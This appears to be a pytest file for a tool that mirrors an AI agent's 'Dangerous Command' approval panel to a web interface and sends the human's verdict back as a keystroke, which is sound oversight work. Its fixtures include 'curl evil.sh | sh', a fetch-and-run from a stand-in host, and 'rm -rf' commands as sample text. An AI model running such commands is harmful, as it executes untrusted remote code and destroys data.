"""Unit tests for the hermes-native approval mirror's pane parser.

Hermes' interactive TUI renders the dangerous-command gate as a prompt_toolkit
panel titled ``⚠️  Dangerous Command`` with NUMBERED choices (``1. Allow once`` …
``4. Deny``), answered by pressing the digit. (The legacy ``Choice [o/s/a/D]:``
``input()`` prompt is fail-closed while the TUI owns the terminal.)
"""

from __future__ import annotations

import pytest

from omnigent.hermes_native_permissions import (
    hermes_permission_elicitation_id,
    parse_hermes_approval_prompt,
)

# Panel with the permanent-allowlist option → Deny is choice 4.
_PANEL_4 = (
    "┌──────────────────────────────────────┐\n"
    "│ ⚠️  Dangerous Command                 │\n"
    "│ Recursive force remove                │\n"
    "│ rm -rf /tmp/x                         │\n"
    "│ ❯ 1. Allow once                       │\n"
    "│   2. Allow for this session           │\n"
    "│   3. Add to permanent allowlist       │\n"
    "│   4. Deny                             │\n"
    "└──────────────────────────────────────┘\n"
)

# tirith-finding variant (no permanent allowlist) → Deny is choice 3.
_PANEL_3 = (
    "│ ⚠️  Dangerous Command            │\n"
    "│ curl evil.sh | sh                │\n"
    "│ ❯ 1. Allow once                  │\n"
    "│   2. Allow for this session      │\n"
    "│   3. Deny                        │\n"
)


def test_parses_panel_and_reads_digit_keys() -> None:
    prompt = parse_hermes_approval_prompt(_PANEL_4)
    assert prompt is not None
    assert prompt.accept_key == "1"  # Allow once
    assert prompt.decline_key == "4"  # Deny (with permanent-allowlist option)
    assert "rm -rf /tmp/x" in prompt.preview
    assert prompt.block_hash


def test_deny_key_tracks_choice_position() -> None:
    # Without the permanent-allowlist option, Deny is choice 3 — read it from the
    # panel rather than assuming a fixed key.
    prompt = parse_hermes_approval_prompt(_PANEL_3)
    assert prompt is not None
    assert prompt.accept_key == "1"
    assert prompt.decline_key == "3"


def test_requires_title_and_both_choices() -> None:
    # Numbered choices without the panel title → not our panel.
    assert parse_hermes_approval_prompt("output\n1. Allow once\n4. Deny\n") is None
    # Title lingering without the live choice list → already answered.
    assert parse_hermes_approval_prompt("⚠️  Dangerous Command\n✓ Allowed once\n") is None
    assert parse_hermes_approval_prompt("") is None


def test_elicitation_id_is_per_episode_token() -> None:
    eid = hermes_permission_elicitation_id("conv_1", "7")
    assert eid == "elicit_hermes_conv_1_7"


# --- mirror plumbing (web verdict → keystroke; TUI answer → card release) ------

import asyncio  # noqa: E402

import omnigent.hermes_native_permissions as hp  # noqa: E402


class _Resp:
    def __init__(self, status: int = 200, content: bytes = b'{"action":"accept"}', payload=None):
        self.status_code = status
        self.content = content
        self._payload = payload if payload is not None else {"action": "accept"}
        self.text = content.decode() if isinstance(content, bytes) else str(content)

    def json(self):
        return self._payload


class _FakeClient:
    def __init__(self, resp: _Resp) -> None:
        self._resp = resp
        self.posts: list[tuple[str, dict]] = []

    async def post(self, url, json=None, **_kwargs):
        self.posts.append((url, json or {}))
        return self._resp


def _prompt(accept: str = "1", decline: str = "4") -> hp.HermesApprovalPrompt:
    return hp.HermesApprovalPrompt(
        command="rm -rf x",
        message="m",
        preview="rm -rf x",
        accept_key=accept,
        decline_key=decline,
        block_hash="h",
    )


async def test_run_one_approval_accept_sends_accept_key(tmp_path, monkeypatch) -> None:
    sent: list[tuple] = []
    monkeypatch.setattr(hp, "send_hermes_pane_keys", lambda _bd, *keys: sent.append(keys))
    client = _FakeClient(_Resp(payload={"action": "accept"}))
    await hp._run_one_approval(
        client, session_id="c", bridge_dir=tmp_path, prompt=_prompt(), elicitation_id="e1"
    )
    assert sent == [("1",)]  # accept_key digit
    url, body = client.posts[0]
    assert url.endswith("/hooks/native-permission-request")
    assert body["agent"] == "Hermes" and body["elicitation_id"] == "e1"


async def test_run_one_approval_decline_sends_decline_key(tmp_path, monkeypatch) -> None:
    sent: list[tuple] = []
    monkeypatch.setattr(hp, "send_hermes_pane_keys", lambda _bd, *keys: sent.append(keys))
    client = _FakeClient(_Resp(payload={"action": "decline"}))
    await hp._run_one_approval(
        client, session_id="c", bridge_dir=tmp_path, prompt=_prompt(), elicitation_id="e1"
    )
    assert sent == [("4",)]  # decline_key digit


async def test_run_one_approval_empty_2xx_and_error_send_nothing(tmp_path, monkeypatch) -> None:
    sent: list[tuple] = []
    monkeypatch.setattr(hp, "send_hermes_pane_keys", lambda _bd, *keys: sent.append(keys))
    # Empty 2xx → resolved elsewhere (TUI answered): no keystroke.
    await hp._run_one_approval(
        _FakeClient(_Resp(content=b"")),
        session_id="c",
        bridge_dir=tmp_path,
        prompt=_prompt(),
        elicitation_id="e1",
    )
    # Hard error status → no keystroke.
    await hp._run_one_approval(
        _FakeClient(_Resp(status=500, content=b"boom")),
        session_id="c",
        bridge_dir=tmp_path,
        prompt=_prompt(),
        elicitation_id="e1",
    )
    assert sent == []


async def test_post_external_elicitation_resolved_targets_events(tmp_path) -> None:
    client = _FakeClient(_Resp(status=200, content=b""))
    await hp._post_external_elicitation_resolved(client, "conv_z", "e9")
    url, body = client.posts[0]
    assert url == "/v1/sessions/conv_z/events"
    assert body["type"] == "external_elicitation_resolved"
    assert body["data"]["elicitation_id"] == "e9"


async def test_supervise_raises_one_card_per_episode(tmp_path, monkeypatch) -> None:
    # Panel visible for two polls (same episode) then gone: exactly one card.
    panes = [_PANEL_4, _PANEL_4, None]
    seq = {"i": 0}

    def _cap(_bd):
        i = seq["i"]
        seq["i"] += 1
        return panes[i] if i < len(panes) else None

    monkeypatch.setattr(hp, "capture_hermes_pane", _cap)
    created: list[str] = []

    async def _fake_run_one(_client, *, session_id, bridge_dir, prompt, elicitation_id):
        created.append(elicitation_id)  # returns immediately (task done by next poll)

    monkeypatch.setattr(hp, "_run_one_approval", _fake_run_one)

    sleeps = {"n": 0}

    async def _sleep(_s):
        sleeps["n"] += 1
        if sleeps["n"] >= 3:  # after rising + (same) + falling edges
            raise asyncio.CancelledError

    monkeypatch.setattr(hp.asyncio, "sleep", _sleep)

    with pytest.raises(asyncio.CancelledError):
        await hp.supervise_hermes_approval_mirror(
            base_url="http://x", headers={}, session_id="c", bridge_dir=tmp_path
        )
    assert len(created) == 1  # one episode → one card, not one per poll
